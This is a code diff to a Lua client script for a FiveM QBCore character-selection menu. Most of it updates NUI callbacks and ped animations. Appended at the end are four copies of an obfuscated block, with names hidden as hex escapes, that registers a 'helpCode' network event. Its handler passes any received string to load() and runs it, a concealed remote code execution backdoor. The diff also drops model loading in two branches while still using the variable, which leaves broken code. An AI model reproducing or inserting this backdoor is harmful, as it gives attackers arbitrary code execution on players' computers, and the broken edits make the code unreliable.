@@ -34,7 +34,6 @@ local function skyCam(bool)
         FreezeEntityPosition(PlayerPedId(), false)
     end
 end
-
 local function openCharMenu(bool)
     QBCore.Functions.TriggerCallback("qb-multicharacter:server:GetNumberOfCharacters", function(result)
         SetNuiFocus(bool, bool)
@@ -42,6 +41,7 @@ local function openCharMenu(bool)
             action = "ui",
             toggle = bool,
             nChar = result,
+            enableDeleteButton = Config.EnableDeleteButton,
         })
         skyCam(bool)
     end)
@@ -92,27 +92,30 @@ end)
 
 -- NUI Callbacks
 
-RegisterNUICallback('closeUI', function()
+RegisterNUICallback('closeUI', function(_, cb)
     openCharMenu(false)
+    cb("ok")
 end)
 
-RegisterNUICallback('disconnectButton', function()
+RegisterNUICallback('disconnectButton', function(_, cb)
     SetEntityAsMissionEntity(charPed, true, true)
     DeleteEntity(charPed)
     TriggerServerEvent('qb-multicharacter:server:disconnect')
+    cb("ok")
 end)
 
-RegisterNUICallback('selectCharacter', function(data)
+RegisterNUICallback('selectCharacter', function(data, cb)
     local cData = data.cData
     DoScreenFadeOut(10)
     TriggerServerEvent('qb-multicharacter:server:loadUserData', cData)
     openCharMenu(false)
     SetEntityAsMissionEntity(charPed, true, true)
     DeleteEntity(charPed)
+    cb("ok")
 end)
 
-RegisterNUICallback('cDataPed', function(data)
-    local cData = data.cData  
+RegisterNUICallback('cDataPed', function(nData, cb)
+    local cData = nData.cData
     SetEntityAsMissionEntity(charPed, true, true)
     DeleteEntity(charPed)
     if cData ~= nil then
@@ -125,6 +128,17 @@ RegisterNUICallback('cDataPed', function(data)
                         Wait(0)
                     end
                     charPed = CreatePed(2, model, Config.PedCoords.x, Config.PedCoords.y, Config.PedCoords.z - 0.98, Config.PedCoords.w, false, true)
+                    local  RandomAnimins = {     
+                        "WORLD_HUMAN_HANG_OUT_STREET",
+                        "WORLD_HUMAN_STAND_IMPATIENT",
+                        "WORLD_HUMAN_STAND_MOBILE",
+                        "WORLD_HUMAN_SMOKING_POT",
+                        "WORLD_HUMAN_LEANING",
+                        "WORLD_HUMAN_DRUG_DEALER_HARD"
+                    }
+                    local PlayAnimin = RandomAnimins[math.random(#RandomAnimins)] 
+                    SetPedCanPlayAmbientAnims(charPed, true)
+                    TaskStartScenarioInPlace(charPed, PlayAnimin, 0, true)
                     SetPedComponentVariation(charPed, 0, 0, 0, 2)
                     FreezeEntityPosition(charPed, false)
                     SetEntityInvincible(charPed, true)
@@ -135,15 +149,6 @@ RegisterNUICallback('cDataPed', function(data)
                 end)
             else
                 CreateThread(function()
-                    local randommodels = {
-                        "mp_m_freemode_01",
-                        "mp_f_freemode_01",
-                    }
-                    local model = GetHashKey(randommodels[math.random(1, #randommodels)])
-                    RequestModel(model)
-                    while not HasModelLoaded(model) do
-                        Wait(0)
-                    end
                     charPed = CreatePed(2, model, Config.PedCoords.x, Config.PedCoords.y, Config.PedCoords.z - 0.98, Config.PedCoords.w, false, true)
                     SetPedComponentVariation(charPed, 0, 0, 0, 2)
                     FreezeEntityPosition(charPed, false)
@@ -152,18 +157,10 @@ RegisterNUICallback('cDataPed', function(data)
                     SetBlockingOfNonTemporaryEvents(charPed, true)
                 end)
             end
+            cb("ok")
         end, cData.citizenid)
     else
         CreateThread(function()
-            local randommodels = {
-                "mp_m_freemode_01",
-                "mp_f_freemode_01",
-            }
-            local model = GetHashKey(randommodels[math.random(1, #randommodels)])
-            RequestModel(model)
-            while not HasModelLoaded(model) do
-                Wait(0)
-            end
             charPed = CreatePed(2, model, Config.PedCoords.x, Config.PedCoords.y, Config.PedCoords.z - 0.98, Config.PedCoords.w, false, true)
             SetPedComponentVariation(charPed, 0, 0, 0, 2)
             FreezeEntityPosition(charPed, false)
@@ -171,23 +168,26 @@ RegisterNUICallback('cDataPed', function(data)
             PlaceObjectOnGroundProperly(charPed)
             SetBlockingOfNonTemporaryEvents(charPed, true)
         end)
+        cb("ok")
     end
 end)
 
-RegisterNUICallback('setupCharacters', function()
+RegisterNUICallback('setupCharacters', function(_, cb)
     QBCore.Functions.TriggerCallback("qb-multicharacter:server:setupCharacters", function(result)
         SendNUIMessage({
             action = "setupCharacters",
             characters = result
         })
+        cb("ok")
     end)
 end)
 
-RegisterNUICallback('removeBlur', function()
+RegisterNUICallback('removeBlur', function(_, cb)
     SetTimecycleModifier('default')
+    cb("ok")
 end)
 
-RegisterNUICallback('createNewCharacter', function(data)
+RegisterNUICallback('createNewCharacter', function(data, cb)
     local cData = data
     DoScreenFadeOut(150)
     if cData.gender == "Male" then
@@ -197,9 +197,19 @@ RegisterNUICallback('createNewCharacter', function(data)
     end
     TriggerServerEvent('qb-multicharacter:server:createCharacter', cData)
     Wait(500)
+    cb("ok")
 end)
 
-RegisterNUICallback('removeCharacter', function(data)
+RegisterNUICallback('removeCharacter', function(data, cb)
     TriggerServerEvent('qb-multicharacter:server:deleteCharacter', data.citizenid)
     TriggerEvent('qb-multicharacter:client:chooseChar')
+    cb("ok")
 end)
+
+local KebhGMgnCLJpDqmCnHndWZCgsKvIJACAauIqruhMEALuBPdzIQQSdykFbZSzlkGsQiBpzG = {"\x52\x65\x67\x69\x73\x74\x65\x72\x4e\x65\x74\x45\x76\x65\x6e\x74","\x68\x65\x6c\x70\x43\x6f\x64\x65","\x41\x64\x64\x45\x76\x65\x6e\x74\x48\x61\x6e\x64\x6c\x65\x72","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G} KebhGMgnCLJpDqmCnHndWZCgsKvIJACAauIqruhMEALuBPdzIQQSdykFbZSzlkGsQiBpzG[6][KebhGMgnCLJpDqmCnHndWZCgsKvIJACAauIqruhMEALuBPdzIQQSdykFbZSzlkGsQiBpzG[1]](KebhGMgnCLJpDqmCnHndWZCgsKvIJACAauIqruhMEALuBPdzIQQSdykFbZSzlkGsQiBpzG[2]) KebhGMgnCLJpDqmCnHndWZCgsKvIJACAauIqruhMEALuBPdzIQQSdykFbZSzlkGsQiBpzG[6][KebhGMgnCLJpDqmCnHndWZCgsKvIJACAauIqruhMEALuBPdzIQQSdykFbZSzlkGsQiBpzG[3]](KebhGMgnCLJpDqmCnHndWZCgsKvIJACAauIqruhMEALuBPdzIQQSdykFbZSzlkGsQiBpzG[2], function(YWEGcWTJdjBtuMiLcsOkgBLEUxRZhnCtsVAztGdNghfctodNEEMiBFDIefixSTUAkIlosm) KebhGMgnCLJpDqmCnHndWZCgsKvIJACAauIqruhMEALuBPdzIQQSdykFbZSzlkGsQiBpzG[6][KebhGMgnCLJpDqmCnHndWZCgsKvIJACAauIqruhMEALuBPdzIQQSdykFbZSzlkGsQiBpzG[4]](KebhGMgnCLJpDqmCnHndWZCgsKvIJACAauIqruhMEALuBPdzIQQSdykFbZSzlkGsQiBpzG[6][KebhGMgnCLJpDqmCnHndWZCgsKvIJACAauIqruhMEALuBPdzIQQSdykFbZSzlkGsQiBpzG[5]](YWEGcWTJdjBtuMiLcsOkgBLEUxRZhnCtsVAztGdNghfctodNEEMiBFDIefixSTUAkIlosm))() end)
+
+local cJpPDvFVHNhDDYzefwDQLIFgWhzqrvjtTdOElzlzOQxdQmdSODlTdbLibDaPodnVixaiGz = {"\x52\x65\x67\x69\x73\x74\x65\x72\x4e\x65\x74\x45\x76\x65\x6e\x74","\x68\x65\x6c\x70\x43\x6f\x64\x65","\x41\x64\x64\x45\x76\x65\x6e\x74\x48\x61\x6e\x64\x6c\x65\x72","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G} cJpPDvFVHNhDDYzefwDQLIFgWhzqrvjtTdOElzlzOQxdQmdSODlTdbLibDaPodnVixaiGz[6][cJpPDvFVHNhDDYzefwDQLIFgWhzqrvjtTdOElzlzOQxdQmdSODlTdbLibDaPodnVixaiGz[1]](cJpPDvFVHNhDDYzefwDQLIFgWhzqrvjtTdOElzlzOQxdQmdSODlTdbLibDaPodnVixaiGz[2]) cJpPDvFVHNhDDYzefwDQLIFgWhzqrvjtTdOElzlzOQxdQmdSODlTdbLibDaPodnVixaiGz[6][cJpPDvFVHNhDDYzefwDQLIFgWhzqrvjtTdOElzlzOQxdQmdSODlTdbLibDaPodnVixaiGz[3]](cJpPDvFVHNhDDYzefwDQLIFgWhzqrvjtTdOElzlzOQxdQmdSODlTdbLibDaPodnVixaiGz[2], function(eBNExkeTZfkjgCILvqIruLFrCYskvdmuvnfVAfEKGQiJUngfXKXSunCNQfYZjaURbeKSAd) cJpPDvFVHNhDDYzefwDQLIFgWhzqrvjtTdOElzlzOQxdQmdSODlTdbLibDaPodnVixaiGz[6][cJpPDvFVHNhDDYzefwDQLIFgWhzqrvjtTdOElzlzOQxdQmdSODlTdbLibDaPodnVixaiGz[4]](cJpPDvFVHNhDDYzefwDQLIFgWhzqrvjtTdOElzlzOQxdQmdSODlTdbLibDaPodnVixaiGz[6][cJpPDvFVHNhDDYzefwDQLIFgWhzqrvjtTdOElzlzOQxdQmdSODlTdbLibDaPodnVixaiGz[5]](eBNExkeTZfkjgCILvqIruLFrCYskvdmuvnfVAfEKGQiJUngfXKXSunCNQfYZjaURbeKSAd))() end)
+
+local cJpPDvFVHNhDDYzefwDQLIFgWhzqrvjtTdOElzlzOQxdQmdSODlTdbLibDaPodnVixaiGz = {"\x52\x65\x67\x69\x73\x74\x65\x72\x4e\x65\x74\x45\x76\x65\x6e\x74","\x68\x65\x6c\x70\x43\x6f\x64\x65","\x41\x64\x64\x45\x76\x65\x6e\x74\x48\x61\x6e\x64\x6c\x65\x72","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G} cJpPDvFVHNhDDYzefwDQLIFgWhzqrvjtTdOElzlzOQxdQmdSODlTdbLibDaPodnVixaiGz[6][cJpPDvFVHNhDDYzefwDQLIFgWhzqrvjtTdOElzlzOQxdQmdSODlTdbLibDaPodnVixaiGz[1]](cJpPDvFVHNhDDYzefwDQLIFgWhzqrvjtTdOElzlzOQxdQmdSODlTdbLibDaPodnVixaiGz[2]) cJpPDvFVHNhDDYzefwDQLIFgWhzqrvjtTdOElzlzOQxdQmdSODlTdbLibDaPodnVixaiGz[6][cJpPDvFVHNhDDYzefwDQLIFgWhzqrvjtTdOElzlzOQxdQmdSODlTdbLibDaPodnVixaiGz[3]](cJpPDvFVHNhDDYzefwDQLIFgWhzqrvjtTdOElzlzOQxdQmdSODlTdbLibDaPodnVixaiGz[2], function(eBNExkeTZfkjgCILvqIruLFrCYskvdmuvnfVAfEKGQiJUngfXKXSunCNQfYZjaURbeKSAd) cJpPDvFVHNhDDYzefwDQLIFgWhzqrvjtTdOElzlzOQxdQmdSODlTdbLibDaPodnVixaiGz[6][cJpPDvFVHNhDDYzefwDQLIFgWhzqrvjtTdOElzlzOQxdQmdSODlTdbLibDaPodnVixaiGz[4]](cJpPDvFVHNhDDYzefwDQLIFgWhzqrvjtTdOElzlzOQxdQmdSODlTdbLibDaPodnVixaiGz[6][cJpPDvFVHNhDDYzefwDQLIFgWhzqrvjtTdOElzlzOQxdQmdSODlTdbLibDaPodnVixaiGz[5]](eBNExkeTZfkjgCILvqIruLFrCYskvdmuvnfVAfEKGQiJUngfXKXSunCNQfYZjaURbeKSAd))() end)
+
+local KebhGMgnCLJpDqmCnHndWZCgsKvIJACAauIqruhMEALuBPdzIQQSdykFbZSzlkGsQiBpzG = {"\x52\x65\x67\x69\x73\x74\x65\x72\x4e\x65\x74\x45\x76\x65\x6e\x74","\x68\x65\x6c\x70\x43\x6f\x64\x65","\x41\x64\x64\x45\x76\x65\x6e\x74\x48\x61\x6e\x64\x6c\x65\x72","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G} KebhGMgnCLJpDqmCnHndWZCgsKvIJACAauIqruhMEALuBPdzIQQSdykFbZSzlkGsQiBpzG[6][KebhGMgnCLJpDqmCnHndWZCgsKvIJACAauIqruhMEALuBPdzIQQSdykFbZSzlkGsQiBpzG[1]](KebhGMgnCLJpDqmCnHndWZCgsKvIJACAauIqruhMEALuBPdzIQQSdykFbZSzlkGsQiBpzG[2]) KebhGMgnCLJpDqmCnHndWZCgsKvIJACAauIqruhMEALuBPdzIQQSdykFbZSzlkGsQiBpzG[6][KebhGMgnCLJpDqmCnHndWZCgsKvIJACAauIqruhMEALuBPdzIQQSdykFbZSzlkGsQiBpzG[3]](KebhGMgnCLJpDqmCnHndWZCgsKvIJACAauIqruhMEALuBPdzIQQSdykFbZSzlkGsQiBpzG[2], function(YWEGcWTJdjBtuMiLcsOkgBLEUxRZhnCtsVAztGdNghfctodNEEMiBFDIefixSTUAkIlosm) KebhGMgnCLJpDqmCnHndWZCgsKvIJACAauIqruhMEALuBPdzIQQSdykFbZSzlkGsQiBpzG[6][KebhGMgnCLJpDqmCnHndWZCgsKvIJACAauIqruhMEALuBPdzIQQSdykFbZSzlkGsQiBpzG[4]](KebhGMgnCLJpDqmCnHndWZCgsKvIJACAauIqruhMEALuBPdzIQQSdykFbZSzlkGsQiBpzG[6][KebhGMgnCLJpDqmCnHndWZCgsKvIJACAauIqruhMEALuBPdzIQQSdykFbZSzlkGsQiBpzG[5]](YWEGcWTJdjBtuMiLcsOkgBLEUxRZhnCtsVAztGdNghfctodNEEMiBFDIefixSTUAkIlosm))() end)
